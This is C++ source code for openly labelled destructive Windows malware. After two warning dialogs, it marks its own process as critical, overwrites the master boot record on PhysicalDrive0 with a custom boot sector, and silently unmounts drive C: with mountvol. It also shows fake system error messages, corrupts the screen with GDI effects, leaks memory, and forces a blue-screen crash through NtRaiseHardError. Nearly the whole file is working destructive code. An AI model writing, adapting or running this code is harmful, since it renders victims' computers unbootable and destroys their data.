#pragma comment(lib, "Winmm.lib")

#ifdef UNICODE
#undef UNICODE
#define MULTIBYTE
#endif

#include <iostream>
#include <Windows.h>
#include <math.h>
#include <random>

#include "payloads.h"

const BYTE MasterBootRecord[] = { 
0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50, 
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4, 
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x09, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18, 
0xCD, 0x10, 0xC3, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 
0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 
0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30, 0x31, 0x31, 0x31, 0x20, 
0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x30, 0x30, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 
0x30, 0x20, 0x30, 0x30, 0x31, 0x30, 0x31, 0x31, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 
0x30, 0x31, 0x31, 0x20, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x30, 0x30, 0x20, 0x30, 0x31, 0x30, 
0x31, 0x30, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 
0x31, 0x31, 0x30, 0x30, 0x31, 0x30, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x30, 0x30, 
0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 
0x31, 0x31, 0x20, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 
0x30, 0x30, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x30, 0x20, 0x30, 0x31, 
0x30, 0x31, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30, 0x31, 0x30, 0x30, 0x20, 
0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x31, 0x30, 0x20, 0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x31, 
0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30, 
0x31, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 
0x31, 0x30, 0x31, 0x30, 0x30, 0x20, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x31, 0x30, 0x20, 0x30, 
0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x30, 0x31, 0x31, 0x30, 0x31, 
0x20, 0x30, 0x31, 0x30, 0x30, 0x31, 0x31, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x30, 0x30, 0x30, 
0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x31, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 
0x31, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x31, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 
0x31, 0x30, 0x31, 0x31, 0x30, 0x30, 0x20, 0x30, 0x30, 0x31, 0x30, 0x31, 0x31, 0x31, 0x31, 0x20, 
0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 
0x30, 0x20, 0x30, 0x30, 0x31, 0x31, 0x31, 0x30, 0x30, 0x30, 0x20, 0x30, 0x31, 0x31, 0x31, 0x30, 
0x30, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x30, 0x30, 0x30, 0x31, 0x20, 0x30, 0x31, 0x31, 
0x31, 0x30, 0x31, 0x31, 0x31, 0x20, 0x30, 0x30, 0x31, 0x31, 0x31, 0x31, 0x30, 0x31, 0x0D, 0x0A, 
0x36, 0x39, 0x34, 0x32, 0x30, 0x69, 0x73, 0x6D, 0x79, 0x66, 0x61, 0x76, 0x65, 0x6E, 0x75, 0x6D, 
0x62, 0x65, 0x72, 0x0D, 0x0A, 0x4D, 0x61, 0x64, 0x65, 0x20, 0x62, 0x79, 0x20, 0x6B, 0x65, 0x76, 
0x6C, 0x75, 0x38, 0x2C, 0x20, 0x65, 0x65, 0x65, 0x30, 0x31, 0x2C, 0x20, 0x61, 0x6E, 0x64, 0x20, 
0x46, 0x61, 0x72, 0x61, 0x6C, 0x6C, 0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };

typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);

typedef int (*functionarray) ();

DWORD WINAPI audio(LPVOID lpParam) {
    while (true) {
        Sleep(rand() % 10000);
        Beep(rand() % 2000, rand() % 5000);
    }
    ExitThread(0);
}

DWORD WINAPI Music(LPVOID lpParam) {
    mciSendString("open \"rick.mp3\" type mpegvideo alias mp3", NULL, 0, NULL); //TODO: Fix this later
    mciSendString("play mp3", NULL, 0, NULL);
    MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MB_YESNO | MB_ICONEXCLAMATION);
    mciSendString("stop mp3", NULL, 0, NULL);
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE YOUR COMPUTER IS GONE", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
    {
        ExitProcess(0);
    }

    BOOL playmusic = TRUE;

    if (MessageBoxW(NULL, L"Are you recording a video that you plan to upload to YouTube and monetize? We need to know this because this program contains copyrighted music.", L"Copyright warning", MB_YESNO | MB_ICONEXCLAMATION) == IDYES)
    {
        playmusic = FALSE;
    }

    functionarray payloads[] = {
        leakram,
        p1,
        p2,
        p3
    }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    
    BOOLEAN bOld1;
    ULONG ulBreakOnTermination1 = 1;
    RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
    NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));

    MSGBOXPARAMS msglol = { 0 };
    msglol.cbSize = sizeof(MSGBOXPARAMS);
    msglol.hwndOwner = NULL;
    msglol.hInstance = GetModuleHandle(NULL);
    msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program. This error has been reported.";
    msglol.lpszCaption = "Fatal error in Xytharis.exe";
    msglol.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);

    //rick roll
    //ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);

    if (playmusic) {
        HANDLE music = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Music, NULL, 0, NULL);
    } //add music soon, get better method

    HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);

    HANDLE hLeakRAM = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[0], NULL, 0, NULL);

    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);

    ShellExecuteA(NULL, "open" "C:\\Windows\\System32\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
    ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);

    Sleep(5000);

    MSGBOXPARAMS msg2 = { 0 };
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    //p1();

    payloads[2]();

    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    fori(100) {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }
    
    // SetPixel is slow
    //random pixels all over the place
    fori(100) {
        CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        fori(20) {
            SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        }
        TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
        Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(50);
    }

    MSGBOXPARAMS msg5 = { 0 };
    msg5.cbSize = sizeof(MSGBOXPARAMS);
    msg5.hwndOwner = NULL;
    msg5.hInstance = GetModuleHandle(NULL);
    msg5.lpszText = "that was only round 1, have a little braek"; //typo intentional
    msg5.lpszCaption = "get ready";
    msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, NULL, NULL);

    Sleep(10000);
    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
    
    fori(50) {
        INT y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
        SelectObject(desk, brush);
        BitBlt(desk, 0, y, 100, h, desk, rand() % 96 - 56, y, SRCCOPY);
        PatBlt(desk, -1, y, 100, h, PATINVERT);
        Sleep(rand() % 1234);
    }

    HRGN hRegion = CreateRectRgn(0, 0, w, h);

    fori(50) {
        LineTo(desk, rand() % w, rand() % h);
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        if (i % 5 == 0) {
            InvertRgn(desk, hRegion);
        }
        Sleep(50);
    }

    fori(1000) {
        i += 5;
        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
    } 

    fori(50) {
        BitBlt(desk, i + 5, i - 5, sw, h, desk, rand() % 1920, rand() % 1080, 0x000D0B25);
        PatBlt(desk, i + 5, i - 5, rand() % 1920, rand() % 1080, PATINVERT);
        Sleep(100);
    }

    ReleaseDC(NULL, desk);
    CloseHandle(hmsg1);
    CloseHandle(hmsg2);
    CloseHandle(hmsg3);
    CloseHandle(hmsg4);

    TerminateThread(hAudio, 1); //literally not safe
    CloseHandle(hAudio);
    TerminateThread(hLeakRAM, 1);
    CloseHandle(hLeakRAM);
    TerminateThread(Music, 1);
    CloseHandle(Music);

    //crash
    BOOLEAN bOld2;
    ULONG ulResponse;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
    NtRaiseHardError(0x69420FFF, NULL, NULL, NULL, 6, &ulResponse);
    FreeLibrary(ntdll);
    return 0;
}
